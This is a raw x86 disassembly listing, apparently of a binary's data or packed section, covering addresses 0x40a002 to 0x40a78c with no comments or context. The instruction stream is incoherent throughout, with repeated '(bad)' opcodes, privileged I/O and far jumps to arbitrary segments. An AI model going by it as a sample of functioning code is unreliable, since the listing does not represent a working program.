  40a002:	call   0x76a7f35c
  40a007:	fistp  WORD PTR [edi-0x12]
  40a00a:	dec    esp
  40a00b:	lahf   
  40a00c:	test   al,0x8
  40a00e:	(bad)  
  40a00f:	int3   
  40a010:	loop   0x409ff1
  40a012:	push   ss
  40a013:	adc    al,0x99
  40a015:	xor    al,BYTE PTR [esi]
  40a017:	inc    edi
  40a019:	mov    BYTE PTR [eax],dl
  40a01b:	sub    DWORD PTR [eax-0x622ec153],ebx
  40a021:	inc    ebp
  40a022:	call   0xe96f:0x61815fee
  40a029:	dec    ebx
  40a02a:	xlat   BYTE PTR ds:[ebx]
  40a02b:	add    ebp,DWORD PTR [edi+0x7a]
  40a02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a02f:	mov    dl,0x70
  40a031:	sbb    esi,DWORD PTR [ecx]
  40a033:	aad    0x6c
  40a035:	mov    bh,0x5e
  40a037:	adc    eax,0x9231ed2d
  40a03c:	lahf   
  40a03d:	sbb    ebx,edx
  40a03f:	add    dh,BYTE PTR ds:0x754e2376
  40a045:	dec    esp
  40a046:	pop    esi
  40a047:	inc    esp
  40a048:	fs jp  0x40a0c9
  40a04b:	sub    BYTE PTR [ebp-0x4f],dh
  40a04e:	xchg   esp,eax
  40a04f:	jnp    0x40a039
  40a051:	jnp    0x40a082
  40a053:	cdq    
  40a054:	nop
  40a055:	sbb    eax,0x859402af
  40a05a:	and    al,0xdd
  40a05c:	sub    eax,0xf25fb439
  40a061:	xor    DWORD PTR [edi-0x4e],ebp
  40a064:	sbb    eax,0xb4415c57
  40a069:	jno    0x40a0c8
  40a06b:	(bad)  
  40a06c:	or     al,0x6c
  40a06e:	adc    bl,BYTE PTR [edi]
  40a070:	adc    edi,DWORD PTR [eax]
  40a072:	neg    BYTE PTR [eax-0x758e2b9e]
  40a078:	popf   
  40a079:	xor    DWORD PTR ds:0x8b8d6681,ebx
  40a07f:	(bad)  
  40a080:	jno    0x40a0e6
  40a082:	je     0x40a023
  40a084:	in     al,dx
  40a085:	push   ecx
  40a086:	sub    eax,0xa14ecd44
  40a08b:	cmp    DWORD PTR [edx-0x5f623aa4],0x4a52a378
  40a095:	mov    bl,0x32
  40a097:	lods   eax,DWORD PTR ds:[esi]
  40a098:	cmc    
  40a099:	imul   eax,DWORD PTR [edx+0x56],0x30b381ea
  40a0a0:	in     eax,0x9d
  40a0a2:	outs   dx,DWORD PTR ds:[esi]
  40a0a3:	jecxz  0x40a11b
  40a0a5:	outs   dx,DWORD PTR ds:[esi]
  40a0a6:	loopne 0x40a0ea
  40a0a8:	jecxz  0x40a09a
  40a0aa:	add    cl,BYTE PTR [ecx]
  40a0ac:	lahf   
  40a0ad:	push   cs
  40a0ae:	enter  0x3665,0xd1
  40a0b2:	test   DWORD PTR [eax+0x5e314d68],0x6f435886
  40a0bc:	or     al,0x9d
  40a0be:	add    al,0x6b
  40a0c0:	retf   
  40a0c1:	push   eax
  40a0c2:	push   esp
  40a0c3:	pusha  
  40a0c4:	and    al,BYTE PTR [esi-0x130aa6a6]
  40a0ca:	aaa    
  40a0cb:	scas   eax,DWORD PTR es:[edi]
  40a0cc:	gs add al,0xa7
  40a0cf:	call   0xb4e3:0xbac5355c
  40a0d6:	mov    ah,0x73
  40a0d8:	retf   
  40a0d9:	cwde   
  40a0da:	dec    ebx
  40a0db:	push   ebx
  40a0dc:	inc    edx
  40a0dd:	arpl   bp,ax
  40a0df:	mov    dh,0xaa
  40a0e1:	sbb    DWORD PTR [ebx+0x33],0xcef0f133
  40a0e8:	pop    edi
  40a0e9:	xor    ecx,DWORD PTR [ebx]
  40a0eb:	repz jmp 0x2586c838
  40a0f1:	jge    0x40a161
  40a0f3:	xor    dh,BYTE PTR [edi-0xf]
  40a0f6:	(bad)
  40a0fa:	inc    edx
  40a0fb:	mov    eax,ds:0xf4fe5288
  40a100:	jo     0x40a0f7
  40a102:	data16 neg al
  40a105:	add    eax,0x4b095c6f
  40a10a:	sub    al,0xae
  40a10c:	pop    ebx
  40a10d:	mov    cl,0x43
  40a10f:	std    
  40a110:	push   edi
  40a111:	sub    bh,bl
  40a113:	pop    es
  40a114:	push   edi
  40a115:	mov    esp,0xdd9c1d49
  40a11a:	push   edi
  40a11b:	shl    BYTE PTR [edi+0xe2fe3f4],1
  40a121:	int3   
  40a122:	(bad)  
  40a123:	daa    
  40a124:	mov    ch,0x9
  40a126:	cs mov ah,0x5b
  40a129:	adc    al,0x8b
  40a12b:	std    
  40a12c:	imul   edx,DWORD PTR [edi-0x27b65279],0xffffffee
  40a133:	jmp    0xdc7b6702
  40a138:	repz int 0x54
  40a13b:	stos   BYTE PTR es:[edi],al
  40a13c:	dec    BYTE PTR [ebx+ebp*4]
  40a13f:	test   DWORD PTR [ebx+0x5971e81b],edi
  40a145:	dec    ebp
  40a146:	jle    0x40a17c
  40a148:	fdivp  st(5),st
  40a14a:	push   esi
  40a14b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a14c:	daa    
  40a14d:	sar    DWORD PTR [esi-0x3],0x65
  40a151:	stos   BYTE PTR es:[edi],al
  40a152:	pop    ebp
  40a153:	inc    ebp
  40a154:	aad    0xc8
  40a156:	sbb    eax,edx
  40a158:	or     bh,dl
  40a15a:	sub    eax,0xaa16c84c
  40a15f:	lock jge 0x40a1aa
  40a162:	mov    cl,0xef
  40a164:	mov    edx,0xc5fc09f9
  40a169:	push   eax
  40a16a:	adc    DWORD PTR [ebx+ebx*2+0x1],ecx
  40a16e:	ja     0x40a0f0
  40a170:	fwait
  40a171:	xor    al,0xc9
  40a173:	mov    edi,0x23da8e60
  40a178:	fwait
  40a179:	out    dx,eax
  40a17a:	dec    edi
  40a17b:	leave  
  40a17c:	push   es
  40a17d:	je     0x40a1c7
  40a17f:	add    cl,BYTE PTR [edi]
  40a181:	cmp    ebx,DWORD PTR [ebp+0x50e68d6f]
  40a187:	adc    ecx,ebx
  40a189:	lahf   
  40a18a:	jne    0x40a1e4
  40a18c:	sahf   
  40a18d:	in     eax,dx
  40a18e:	cld    
  40a18f:	adc    al,0x65
  40a191:	shl    dh,0xf
  40a194:	in     al,0xe
  40a196:	mov    esp,ecx
  40a198:	pop    esp
  40a199:	pushf  
  40a19a:	jnp    0x40a1d6
  40a19c:	lods   al,BYTE PTR ds:[esi]
  40a19d:	xlat   BYTE PTR ds:[ebx]
  40a19e:	or     cl,BYTE PTR [ebp+0x6e02704c]
  40a1a4:	int    0x2e
  40a1a6:	xor    esp,ebx
  40a1a8:	xlat   BYTE PTR ds:[ebx]
  40a1a9:	or     al,0x18
  40a1ab:	push   ecx
  40a1ac:	cli    
  40a1ad:	mov    BYTE PTR [ebp-0x39],ch
  40a1b0:	cli    
  40a1b1:	out    0xac,eax
  40a1b3:	push   edx
  40a1b4:	and    edi,ecx
  40a1b6:	sbb    eax,0x71f2374a
  40a1bb:	cmp    esi,0xd
  40a1be:	fdiv   QWORD PTR [esi]
  40a1c0:	outs   dx,BYTE PTR ds:[esi]
  40a1c1:	pop    es
  40a1c2:	les    edx,FWORD PTR [ebx+0x66948709]
  40a1c8:	pusha  
  40a1c9:	xchg   ecx,eax
  40a1ca:	xor    eax,0x197166
  40a1cf:	jmp    0x3efe:0x2cb71246
  40a1d6:	(bad)  
  40a1d7:	mov    bh,0xdc
  40a1d9:	or     ah,BYTE PTR [edx+0x44ea6128]
  40a1df:	sbb    dh,ch
  40a1e1:	dec    ebx
  40a1e2:	shr    DWORD PTR [ecx-0x47],1
  40a1e5:	adc    BYTE PTR [ebx+0x165fd060],al
  40a1eb:	stos   BYTE PTR es:[edi],al
  40a1ec:	or     esi,eax
  40a1ee:	shl    BYTE PTR [esi+0x13],cl
  40a1f1:	into   
  40a1f2:	in     eax,dx
  40a1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1f4:	lahf   
  40a1f5:	pop    edi
  40a1f6:	mov    ecx,0xf449374c
  40a1fb:	push   ebx
  40a1fc:	push   ebx
  40a1fd:	dec    edi
  40a1fe:	push   ss
  40a1ff:	ins    BYTE PTR es:[edi],dx
  40a200:	push   cs
  40a201:	inc    ebp
  40a202:	inc    esi
  40a203:	imul   edx,DWORD PTR [edx+0x54],0x28
  40a207:	test   DWORD PTR [esi],eax
  40a209:	push   ebp
  40a20a:	dec    edi
  40a20b:	fisttp QWORD PTR [eax+ebp*8-0x78090388]
  40a212:	dec    ebx
  40a213:	xor    al,0xf5
  40a215:	jp     0x40a28a
  40a217:	out    0xef,al
  40a219:	jne    0x40a233
  40a21b:	mov    esi,0xcc6cc25d
  40a220:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a221:	xor    cl,BYTE PTR [ebp+0x2d]
  40a224:	pusha  
  40a225:	dec    ebp
  40a226:	lds    edx,FWORD PTR [esi+0x5101e3d3]
  40a22c:	bound  edi,QWORD PTR [eax+0x3c89d390]
  40a232:	ins    DWORD PTR es:[edi],dx
  40a233:	das    
  40a234:	jb     0x40a292
  40a236:	cmp    eax,DWORD PTR [edi+0x1680ed5e]
  40a23c:	dec    esi
  40a23d:	xlat   BYTE PTR ds:[ebx]
  40a23e:	gs inc eax
  40a240:	retf   
  40a241:	mov    dh,BYTE PTR [edx-0x45]
  40a244:	mov    al,0x14
  40a246:	(bad)  
  40a247:	sbb    edx,edi
  40a249:	sar    BYTE PTR [ecx-0x1355ae8c],1
  40a24f:	stos   DWORD PTR es:[edi],eax
  40a250:	push   0xc2ee4d56
  40a255:	push   ebx
  40a256:	xor    eax,eax
  40a258:	mov    esi,0x201ff82
  40a25d:	daa    
  40a25e:	ret    0x1c00
  40a261:	adc    ch,ch
  40a263:	cmp    DWORD PTR [ecx],ebp
  40a265:	and    ebp,DWORD PTR [ecx-0x4aaacf45]
  40a26b:	add    BYTE PTR [esi-0x60],0xf5
  40a26f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a270:	add    bl,BYTE PTR [edx+0x57]
  40a273:	aad    0x67
  40a275:	std    
  40a276:	pushw  0x7d
  40a279:	or     WORD PTR [edi-0x6e],bp
  40a27d:	stos   DWORD PTR es:[edi],eax
  40a27e:	mov    ds:0x20813302,al
  40a283:	cld    
  40a284:	inc    eax
  40a285:	and    edx,esp
  40a287:	into   
  40a288:	test   bx,0xac90
  40a28d:	ds dec esi
  40a28f:	push   0x63
  40a291:	add    dh,dl
  40a293:	push   ss
  40a294:	stos   DWORD PTR es:[edi],eax
  40a295:	adc    al,ch
  40a297:	out    dx,al
  40a298:	sub    ch,BYTE PTR [eax-0x3c67ce29]
  40a29e:	mov    dh,0x87
  40a2a0:	loopne 0x40a28e
  40a2a2:	mov    esi,0x61d45993
  40a2a7:	mov    esp,DWORD PTR [edi]
  40a2a9:	sbb    eax,0x6657ad8b
  40a2ae:	(bad)  
  40a2af:	jb     0x40a2ae
  40a2b1:	xor    ebx,DWORD PTR [esi+0x68]
  40a2b4:	mov    al,0xe4
  40a2b6:	jae    0x40a31d
  40a2b8:	scas   al,BYTE PTR es:[edi]
  40a2b9:	mov    ah,0x31
  40a2bb:	cld    
  40a2bc:	lock ins DWORD PTR es:[edi],dx
  40a2be:	fstp   TBYTE PTR ds:0xf877c909
  40a2c4:	dec    esi
  40a2c5:	lea    ebx,[esi-0x4d]
  40a2c8:	js     0x52fd81f0
  40a2ce:	push   ss
  40a2cf:	ins    DWORD PTR es:[edi],dx
  40a2d0:	sub    DWORD PTR [edi-0x64],ebp
  40a2d3:	add    eax,0xdcc7f8e
  40a2d8:	mov    bl,0x18
  40a2da:	out    0x16,al
  40a2dc:	add    DWORD PTR [eax-0x5],edx
  40a2df:	jl     0x40a338
  40a2e1:	stos   DWORD PTR es:[edi],eax
  40a2e2:	gs std 
  40a2e4:	add    eax,edi
  40a2e6:	xor    DWORD PTR [eax],ecx
  40a2e8:	add    al,0x47
  40a2ea:	mov    al,0x3e
  40a2ec:	call   0x344873e1
  40a2f1:	fnstsw WORD PTR [edi-0x67dfb6]
  40a2f7:	call   0xee497377
  40a2fc:	sbb    eax,DWORD PTR ds:0xbcbb2898
  40a302:	jmp    0x7127bb97
  40a307:	mov    ds:0x421d1db1,eax
  40a30c:	shr    edi,0xaf
  40a30f:	mov    al,0xd3
  40a311:	dec    esp
  40a312:	(bad)  
  40a313:	mov    ss,eax
  40a315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a316:	adc    esi,edx
  40a318:	add    ah,ch
  40a31a:	imul   esp,esp,0x4c6b87
  40a320:	cwde   
  40a321:	mov    eax,DWORD PTR [edx-0x21ae26d2]
  40a327:	call   0x71d2:0x9f476b7
  40a32e:	pop    ss
  40a32f:	jno    0x40a2bd
  40a331:	add    BYTE PTR [ebx],dl
  40a333:	jae    0x40a331
  40a335:	adc    eax,edx
  40a337:	adc    cl,BYTE PTR [ebp-0x6ee6229d]
  40a33d:	lea    eax,[edx+0x10a27c8c]
  40a343:	sbb    dl,dh
  40a345:	(bad)  
  40a346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a347:	lock pop esp
  40a349:	jmp    0xb2b3bc87
  40a34e:	jg     0x40a34e
  40a350:	(bad)  
  40a351:	fdiv   DWORD PTR [eax+0x31]
  40a354:	pusha  
  40a355:	cmp    al,0xb1
  40a357:	test   BYTE PTR [eax+0x6],dl
  40a35a:	mov    bh,BYTE PTR [ebx-0x51a50928]
  40a360:	outs   dx,BYTE PTR ds:[esi]
  40a361:	dec    ebp
  40a362:	or     BYTE PTR [eax],al
  40a364:	pop    eax
  40a365:	push   ecx
  40a366:	or     esi,DWORD PTR [ebx-0x68c1620]
  40a36c:	sahf   
  40a36d:	mov    eax,ds:0xac855561
  40a372:	imul   BYTE PTR [edx]
  40a374:	pop    edx
  40a375:	mov    bl,al
  40a377:	xchg   edx,eax
  40a378:	add    al,cl
  40a37a:	jnp    0x40a3de
  40a37c:	dec    edx
  40a37d:	sub    al,0xd
  40a37f:	push   0xb13863d9
  40a384:	or     BYTE PTR [edi+0x1b],ah
  40a387:	lahf   
  40a388:	fldcw  WORD PTR [esp+edx*1+0x41]
  40a38c:	xchg   edi,eax
  40a38d:	or     eax,0xf0017a95
  40a392:	adc    eax,0xe93f3abe
  40a397:	stos   DWORD PTR es:[edi],eax
  40a398:	icebp  
  40a399:	ror    DWORD PTR [esp+eiz*2-0x172534c1],0x1b
  40a3a1:	cmp    esp,ebx
  40a3a3:	das    
  40a3a4:	imul   ecx,DWORD PTR [esp+eax*1+0x7375f0d3],0x38c8407a
  40a3af:	fcmovu st,st(6)
  40a3b1:	in     al,0x27
  40a3b3:	jp     0x40a34a
  40a3b5:	enter  0xa9c0,0x8c
  40a3b9:	and    bh,BYTE PTR [esi]
  40a3bb:	push   eax
  40a3bc:	mov    esp,0xbdd8391a
  40a3c1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40a3c3:	(bad)  
  40a3c4:	cmp    bh,bl
  40a3c6:	inc    eax
  40a3c7:	cmp    BYTE PTR [ebx+0x69],ch
  40a3ca:	mov    edx,esi
  40a3cc:	sti    
  40a3cd:	add    DWORD PTR [ebp+0x5a],ebp
  40a3d0:	cli    
  40a3d1:	sub    DWORD PTR [ebx-0x7510e519],ebp
  40a3d7:	sub    ebp,DWORD PTR [edx+edi*2-0x721428bd]
  40a3de:	mov    ds:0xa22af64a,al
  40a3e3:	pop    edx
  40a3e4:	inc    esp
  40a3e5:	xchg   edx,eax
  40a3e6:	mov    eax,ds:0x9fd60b19
  40a3eb:	sbb    eax,0x11c5cf27
  40a3f0:	mov    WORD PTR [ebx+eax*8+0x1a],es
  40a3f4:	dec    ebx
  40a3f5:	adc    eax,0x5ba2c2ba
  40a3fa:	mov    edi,0xa63944a4
  40a3ff:	or     al,0x36
  40a401:	dec    edi
  40a402:	cmc    
  40a403:	add    ecx,edi
  40a405:	arpl   WORD PTR [eax],cx
  40a407:	push   es
  40a408:	mov    dh,0x6
  40a40a:	add    esp,esi
  40a40c:	out    0x4a,eax
  40a40e:	cmp    DWORD PTR ds:[ecx],ebp
  40a411:	xor    ah,dl
  40a413:	cmc    
  40a414:	mov    cl,0x5b
  40a416:	jecxz  0x40a480
  40a418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a419:	add    al,0x55
  40a41b:	lahf   
  40a41c:	fstp   QWORD PTR [ecx+0x6f]
  40a41f:	shl    BYTE PTR [esi],cl
  40a421:	sbb    BYTE PTR [ecx-0x2de404cb],dl
  40a427:	mov    DWORD PTR [edx],edi
  40a429:	fstp   DWORD PTR [edx+0x37ba1eb9]
  40a42f:	bound  edx,QWORD PTR [edx-0xc]
  40a432:	popf   
  40a433:	aas    
  40a434:	pop    ebp
  40a435:	loop   0x40a475
  40a437:	sub    eax,0x9847c9e6
  40a43c:	test   BYTE PTR [edx-0xa78b242],cl
  40a442:	xor    al,0xfd
  40a444:	imul   ebx,ebx,0x553e75b6
  40a44a:	arpl   WORD PTR [ebx-0x3defc7d7],dx
  40a450:	sub    eax,DWORD PTR [esi-0x4e14f341]
  40a456:	mov    esp,DWORD PTR [ebp+edi*1+0x2d]
  40a45a:	loopne 0x40a488
  40a45c:	inc    ebp
  40a45d:	(bad)  
  40a45e:	mov    BYTE PTR [esi],al
  40a460:	pop    ecx
  40a461:	adc    al,0xb1
  40a463:	loopne 0x40a434
  40a465:	and    edx,esp
  40a467:	cmovl  ebx,DWORD PTR [ebp+0x7c]
  40a46b:	or     ebp,DWORD PTR [ebx]
  40a46d:	pop    es
  40a46e:	clc    
  40a46f:	in     eax,0xcb
  40a471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a472:	push   edi
  40a473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a474:	fs sahf 
  40a476:	jns    0x40a41a
  40a478:	sti    
  40a479:	int3   
  40a47a:	pusha  
  40a47b:	jns    0x40a488
  40a47d:	lea    ecx,[eax+ebx*4+0x27cb047a]
  40a484:	ins    DWORD PTR es:[edi],dx
  40a485:	and    ebp,DWORD PTR [esi]
  40a487:	je     0x40a4b4
  40a489:	xchg   esi,eax
  40a48a:	jge    0x40a45c
  40a48c:	daa    
  40a48d:	mov    dl,0xf6
  40a48f:	adc    BYTE PTR [ecx+0x71],bl
  40a492:	xor    ecx,eax
  40a494:	add    DWORD PTR [ecx],eax
  40a496:	scas   al,BYTE PTR es:[edi]
  40a497:	test   eax,0xff45415e
  40a49c:	adc    bl,BYTE PTR [ebp+edx*1-0x2]
  40a4a0:	push   cs
  40a4a1:	das    
  40a4a2:	mov    dl,0xc5
  40a4a4:	xor    al,0x96
  40a4a6:	test   eax,0xdc59a2e0
  40a4ab:	sar    DWORD PTR [ebp-0x5de931ea],0x95
  40a4b2:	mov    al,ds:0xdd074566
  40a4b7:	dec    esi
  40a4b8:	pusha  
  40a4b9:	call   FWORD PTR ds:0x973610c9
  40a4bf:	imul   edi,DWORD PTR [edx],0xd3742bcf
  40a4c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c6:	jno    0x40a4b6
  40a4c8:	xor    eax,0xca575ba2
  40a4cd:	(bad)  
  40a4ce:	adc    BYTE PTR [edx+eax*1+0x1b],ah
  40a4d2:	cmp    DWORD PTR [eax],esi
  40a4d4:	lods   eax,DWORD PTR ds:[esi]
  40a4d5:	ins    BYTE PTR es:[edi],dx
  40a4d6:	xor    dh,al
  40a4d8:	shl    ebp,cl
  40a4da:	iret   
  40a4db:	jmp    0x174210fa
  40a4e0:	pop    ds
  40a4e1:	out    dx,eax
  40a4e2:	xor    DWORD PTR [ebp+0x5b],edi
  40a4e5:	popa   
  40a4e6:	or     ebp,0x9748098f
  40a4ec:	shr    BYTE PTR [ebp-0x36],cl
  40a4ef:	mov    DWORD PTR [ecx+ebp*2+0x3c],0xa76b84df
  40a4f7:	(bad)
  40a4fa:	bound  edi,QWORD PTR [edi*4+0x71e0ea15]
  40a501:	out    dx,al
  40a502:	retf   0x745
  40a505:	jb     0x40a53c
  40a507:	fcomp  QWORD PTR [eax]
  40a509:	outs   dx,DWORD PTR ds:[esi]
  40a50a:	mov    esi,cs
  40a50c:	fidivr WORD PTR [edi+0x13]
  40a50f:	xor    al,ch
  40a511:	mov    ?,WORD PTR [edi-0x14d00b7a]
  40a517:	ficom  WORD PTR [ebx+0x2a1342ad]
  40a51d:	mov    esp,0xc64a4840
  40a522:	fdivr  QWORD PTR [edi]
  40a524:	adc    bh,BYTE PTR [ebx+esi*8-0x28b9864a]
  40a52b:	mov    gs,WORD PTR [edi+0x77]
  40a52e:	pop    eax
  40a52f:	dec    edi
  40a530:	mov    DWORD PTR [ebx-0x6b9305ac],ebp
  40a536:	jo     0x40a551
  40a538:	jp     0x40a589
  40a53a:	add    BYTE PTR [esi+0x7a],dh
  40a53d:	cld    
  40a53e:	cmp    DWORD PTR [ebx-0x726ca482],ebx
  40a544:	add    eax,edx
  40a546:	test   al,0x69
  40a549:	or     esp,eax
  40a54b:	(bad)  
  40a54c:	pushf  
  40a54d:	sbb    dh,BYTE PTR [edi+0x5d]
  40a550:	cld    
  40a551:	idiv   DWORD PTR cs:[edx+0x76c8f55c]
  40a558:	mov    bh,0x43
  40a55a:	stos   DWORD PTR es:[edi],eax
  40a55b:	push   edx
  40a55c:	inc    ax
  40a55e:	add    eax,0x56d41ce1
  40a563:	lds    edx,FWORD PTR [ebp+0x5]
  40a566:	xchg   edi,eax
  40a567:	pop    es
  40a568:	or     eax,0x4735d6
  40a56d:	fisubr DWORD PTR [edx+0x50]
  40a570:	jo     0x2852603f
  40a576:	shl    BYTE PTR [esi+0x431ccd1],0x60
  40a57d:	pop    ebx
  40a57e:	jns    0x40a596
  40a580:	push   ebx
  40a581:	out    dx,al
  40a582:	add    eax,0x9cb3ae43
  40a587:	(bad)  
  40a589:	ins    DWORD PTR es:[edi],dx
  40a58a:	cdq    
  40a58b:	fcomp  DWORD PTR [esi-0x594ce7f1]
  40a591:	jne    0x40a5d5
  40a593:	stc    
  40a594:	mov    ebp,0xc99f0839
  40a599:	fisttp WORD PTR [ebx+0x68]
  40a59c:	inc    esi
  40a59d:	aas    
  40a59e:	pusha  
  40a59f:	mov    ds:0x4549d3ba,al
  40a5a4:	imul   eax,DWORD PTR [edx-0xa],0xc
  40a5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5a9:	push   edi
  40a5aa:	inc    esi
  40a5ab:	push   es
  40a5ac:	cli    
  40a5ad:	(bad)  
  40a5ae:	frstor [ebp-0x58]
  40a5b1:	mov    fs,WORD PTR [edi+edx*4]
  40a5b4:	mov    dl,0x5
  40a5b6:	adc    dh,BYTE PTR ds:0x9fa6348f
  40a5bc:	sbb    al,0xe4
  40a5be:	or     ecx,DWORD PTR [edi-0x11]
  40a5c1:	or     DWORD PTR [eax+0x77],esp
  40a5c4:	in     eax,0x15
  40a5c6:	lods   eax,DWORD PTR ds:[esi]
  40a5c7:	ja     0x40a571
  40a5c9:	std    
  40a5ca:	pop    es
  40a5cb:	fimul  DWORD PTR [edi]
  40a5cd:	inc    edx
  40a5ce:	jle    0x40a645
  40a5d0:	sbb    eax,0xe1196f94
  40a5d5:	jmp    0x40a613
  40a5d7:	cmp    DWORD PTR [edx+0x797c1fae],ebx
  40a5dd:	or     eax,0xf3516ba2
  40a5e2:	loopne 0x40a586
  40a5e4:	push   es
  40a5e5:	int3   
  40a5e6:	xlat   BYTE PTR ds:[ebx]
  40a5e7:	xchg   ecx,eax
  40a5e8:	adc    al,0xd
  40a5ea:	cli    
  40a5eb:	ins    DWORD PTR es:[edi],dx
  40a5ec:	into   
  40a5ed:	ins    DWORD PTR es:[edi],dx
  40a5ee:	dec    ebp
  40a5ef:	test   DWORD PTR [esi+0x39d28527],eax
  40a5f5:	mov    esp,0x8a49b632
  40a5fa:	adc    ebx,DWORD PTR [ebp+0x79]
  40a5fd:	dec    ecx
  40a5fe:	mov    ch,0x5d
  40a600:	mov    bl,bh
  40a602:	pop    eax
  40a603:	retf   0x2f98
  40a606:	js     0x40a65e
  40a608:	pop    eax
  40a609:	mov    ebp,0x6e2e9dbf
  40a60e:	call   0x53ce:0x173c069a
  40a615:	arpl   WORD PTR [edi],si
  40a617:	xor    eax,DWORD PTR [eax-0x65214e63]
  40a61d:	push   ds
  40a61e:	(bad)  
  40a61f:	xchg   ebp,eax
  40a620:	retf   
  40a621:	dec    edi
  40a622:	stc    
  40a623:	call   0xfee53642
  40a628:	xchg   ebp,eax
  40a629:	cmp    eax,0x867c6e09
  40a62e:	cmp    bh,ch
  40a630:	ja     0x40a5f4
  40a632:	and    eax,DWORD PTR [eax-0x7fa5ef6]
  40a638:	mov    edi,0xecc393a0
  40a63d:	push   esi
  40a63e:	or     al,0x83
  40a640:	xor    al,BYTE PTR [ecx+0x559d29b0]
  40a646:	jmp    0xb5fc:0xc7db8483
  40a64d:	pop    ebp
  40a64e:	mov    ecx,0xc0828945
  40a653:	stos   DWORD PTR es:[edi],eax
  40a654:	in     al,dx
  40a655:	imul   eax,edx,0x1c
  40a658:	pusha  
  40a659:	into   
  40a65a:	mov    ebp,0xd70be4b8
  40a65f:	sub    eax,0x467b3a74
  40a664:	push   esi
  40a665:	xchg   ecx,eax
  40a666:	loop   0x40a5ec
  40a668:	ins    BYTE PTR es:[edi],dx
  40a669:	cmp    eax,0xcb04304d
  40a66e:	jo     0x40a6b2
  40a670:	cdq    
  40a671:	mov    dh,0x75
  40a673:	or     DWORD PTR [ebp-0x6ace0a9a],0x6160d1ea
  40a67d:	ffree  st(0)
  40a67f:	adc    edx,DWORD PTR [edi+0x3603ea22]
  40a685:	dec    eax
  40a686:	sar    DWORD PTR [edx-0x4372c87f],cl
  40a68c:	dec    eax
  40a68d:	lock data16 fistp WORD PTR [edi+0x7bf2e3c0]
  40a695:	jae    0x40a6d0
  40a697:	aad    0xe
  40a699:	or     al,0x8c
  40a69b:	xchg   edx,eax
  40a69c:	jnp    0x40a643
  40a69e:	pop    es
  40a69f:	mov    ebp,0xd1c11885
  40a6a4:	sub    dl,dl
  40a6a6:	xchg   edi,eax
  40a6a7:	inc    ebp
  40a6a8:	dec    esp
  40a6a9:	in     al,0xca
  40a6ab:	or     eax,0xa892e024
  40a6b0:	push   ebx
  40a6b1:	xor    eax,ecx
  40a6b3:	inc    esp
  40a6b4:	push   esi
  40a6b5:	imul   esp,DWORD PTR [ebx-0x74],0xa03f9535
  40a6bc:	pop    eax
  40a6bd:	jmp    0x40a73c
  40a6bf:	mov    bl,0x32
  40a6c1:	retf   
  40a6c2:	xlat   BYTE PTR es:[ebx]
  40a6c4:	frstor [edx]
  40a6c6:	and    bh,dl
  40a6c8:	scas   al,BYTE PTR es:[edi]
  40a6c9:	adc    DWORD PTR [edx],eax
  40a6cb:	sub    al,0x2a
  40a6cd:	or     DWORD PTR ds:0xe0306e92,0xffffff96
  40a6d4:	xchg   DWORD PTR ss:[esi-0x10fd9bca],esi
  40a6db:	dec    esp
  40a6dc:	mov    eax,0xd8d91bb2
  40a6e1:	sub    al,0x2b
  40a6e3:	lods   eax,DWORD PTR ds:[esi]
  40a6e4:	mov    eax,0x97c82bc5
  40a6e9:	mov    ds:0x8eed40c8,al
  40a6ee:	mov    al,ds:0x579eb24f
  40a6f3:	cld    
  40a6f4:	push   ecx
  40a6f5:	add    BYTE PTR [ecx-0x7],ah
  40a6f8:	mul    DWORD PTR [esi-0x78]
  40a6fb:	or     eax,DWORD PTR [edi]
  40a6fd:	push   ss
  40a6fe:	pop    esi
  40a6ff:	sbb    al,0x63
  40a701:	(bad)  
  40a702:	fbld   TBYTE PTR [esi+0x70]
  40a705:	adc    BYTE PTR [ebx-0x5ef09ce9],dl
  40a70b:	adc    DWORD PTR [ebp-0x15ac749],eax
  40a711:	dec    ebp
  40a712:	push   0xb78a745d
  40a717:	mov    ecx,DWORD PTR [eax]
  40a719:	out    0xd7,al
  40a71b:	pusha  
  40a71c:	loopne 0x40a743
  40a71e:	xchg   DWORD PTR [ebx-0x75424182],edi
  40a724:	sbb    al,0x4d
  40a726:	xor    BYTE PTR [ebp-0x75],ch
  40a729:	fmul   QWORD PTR [edx]
  40a72b:	call   0x3a264430
  40a730:	dec    esi
  40a731:	test   eax,0x5ab00fea
  40a736:	fldcw  WORD PTR [ebx]
  40a738:	sar    BYTE PTR [edi],1
  40a73a:	pop    esp
  40a73b:	push   edx
  40a73c:	jb     0x40a6f0
  40a73e:	lahf   
  40a73f:	dec    eax
  40a740:	push   edi
  40a741:	loopne 0x40a6ca
  40a743:	mov    esi,0xdbcd9299
  40a748:	iret   
  40a749:	js     0x40a76d
  40a74b:	call   FWORD PTR [ebx+0x69]
  40a74e:	daa    
  40a74f:	push   eax
  40a750:	inc    esp
  40a751:	inc    edi
  40a752:	aam    0xed
  40a754:	and    eax,0x722ecc66
  40a759:	mov    ebp,0x27020fe1
  40a75e:	test   DWORD PTR [eax],ebx
  40a760:	inc    esp
  40a761:	fsubr  DWORD PTR [esi+0x57]
  40a764:	xchg   BYTE PTR [edx],bh
  40a766:	rcr    ebx,cl
  40a768:	mov    al,0xbb
  40a76a:	push   ebp
  40a76b:	inc    edx
  40a76c:	xchg   edx,eax
  40a76d:	pop    ecx
  40a76e:	and    edx,esp
  40a770:	add    ebp,DWORD PTR [edi]
  40a772:	or     esp,DWORD PTR [edi+0x6ca4a70d]
  40a778:	or     bh,BYTE PTR [eax+0x7c]
  40a77b:	mov    dh,0x51
  40a77d:	mov    ds:0x2e0e56c1,al
  40a782:	rcr    BYTE PTR [edx],1
  40a784:	inc    esi
  40a785:	imul   ebx,DWORD PTR [edi+0x54871575],0x4
  40a78c:	ficom  WORD PTR ds:0x876dec2
